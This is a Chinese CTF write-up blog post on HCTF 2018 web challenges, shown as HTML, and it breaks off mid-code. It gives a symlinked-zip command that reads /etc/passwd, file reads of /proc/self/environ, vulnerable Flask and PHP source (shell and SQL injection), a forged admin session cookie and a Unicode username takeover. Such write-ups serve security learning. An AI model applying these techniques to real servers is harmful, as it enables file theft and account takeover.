@@ -1,0 +1,1323 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="N0rth3ty">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="N0rth3ty">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="每一顶白帽都有一道黑边">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>HCTF WEB部分题解 · N0rth3ty&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/img/a.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >N0rth3ty&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">HCTF WEB部分题解</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>N0rth3ty's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/img/02.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            HCTF WEB部分题解
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "WP">WP</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.2k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/12</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>这个题上来看到cookie感觉有点像jwt，然后又要admin登陆<br>再加上文件上传的点提示有个secret，大概猜到是要读一个key伪造cookie登陆<br>zip后台是解析了的，所以一开始跑偏了，想到Zip Slip目录遍历漏洞<br>这里我没法判断是个什么语言的站(tcl<br>后来老大告知可以用软链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /ect/passwd test</span><br><span class="line">zip -y test.zip test</span><br></pre></td></tr></table></figure></p>
+<p>先知上有篇文章 <a href="https://xz.aliyun.com/t/2589" target="_blank" rel="noopener">https://xz.aliyun.com/t/2589</a><br>测试了一下确实可以读到东西<br><img src="/img/11_1.jpg" alt="image"><br>然后又不知道读什么，就卡住了  </p>
+<p>然后看一下配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes auto;</span><br><span class="line"></span><br><span class="line">error_log  /var/log/nginx/error.log warn;</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br><span class="line">daemon off;</span><br></pre></td></tr></table></figure></p>
+<p>找了半天也没找到server<br>赛后看了wp发现知识面还是太窄了<br>这题我思路蛮清晰的，都知道大概要干嘛，但是面对黑盒真的不知道要读什么(要补一手开发<br><code>/proc/self/environ</code>能读到uwsgi配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi</span><br><span class="line">SUPERVISOR_GROUP_NAME=uwsgi</span><br><span class="line">HOSTNAME=323a960bcc1a</span><br><span class="line">SHLVL=0</span><br><span class="line">PYTHON_PIP_VERSION=18.1</span><br><span class="line">HOME=/root</span><br><span class="line">GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</span><br><span class="line">NGINX_MAX_UPLOAD=0</span><br><span class="line">UWSGI_PROCESSES=16</span><br><span class="line">STATIC_URL=/static</span><br><span class="line">UWSGI_CHEAPER=2</span><br><span class="line">NGINX_VERSION=1.13.12-1~stretch</span><br><span class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">NJS_VERSION=1.13.12.0.2.0-1~stretch</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">SUPERVISOR_ENABLED=1</span><br><span class="line">PYTHON_VERSION=3.6.6</span><br><span class="line">NGINX_WORKER_PROCESSES=auto</span><br><span class="line">SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME=uwsgi</span><br><span class="line">LISTEN_PORT=80STATIC_INDEX=0</span><br><span class="line">PWD=/app/hard_t0_guess_n9f5a95b5ku9fg</span><br><span class="line">STATIC_PATH=/app/static</span><br><span class="line">PYTHONPATH=/app</span><br><span class="line">UWSGI_RELOADS</span><br></pre></td></tr></table></figure></p>
+<p>发现web目录，<br>接着读/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini<br>发现主文件/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py<br>然后可以读到源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line"></span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">      os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure></p>
+<p>因为思路很清晰，就是要伪造admin登陆(开始还猜会不会是jwt<br>所以拿到源码就很容易了，这里是一个伪随机数<br>种子是uuid.getnode()，也就是机器的mac地址<br>mac地址读/sys/class/net/eth0/address后转10进制即可<br>知道了secret_key伪造session即可成功登录拿到flag<br>得到<code>secret_key=11.935137566861131</code><br>尝试伪造session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.Dskfqg.pA9vis7kXInrrctifopdPNUOQOk</span><br></pre></td></tr></table></figure></p>
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>change页面里有个github地址，做题还是要细心啊<br>拖下来审计一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure></p>
+<p>问题主要出在这里<code>name = strlower(session[&#39;name&#39;])</code><br>这个函数在处理unicode字符时有一些<a href="https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e" target="_blank" rel="noopener">问题</a><br>比如ᴬ会被转换为A，注册一个ᴬdmin用户，登录后为Admin,再修改密码则越权修改了admin的密码，登录看到flag  </p>
+<p>另外赛后看到还有条件竞争的解法，先放放…    </p>
+<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p>访问会跳转官网<br>扫目录康康<br>可以看到<a href="http://www.zip有源码泄露，下载下来审计" target="_blank" rel="noopener">www.zip有源码泄露，下载下来审计</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'IN_CRONLITE'</span>)) <span class="keyword">exit</span>();</span><br><span class="line">$islogin = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"islogin"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"login_data"</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">'admin_user'</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($udata[<span class="string">'username'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">       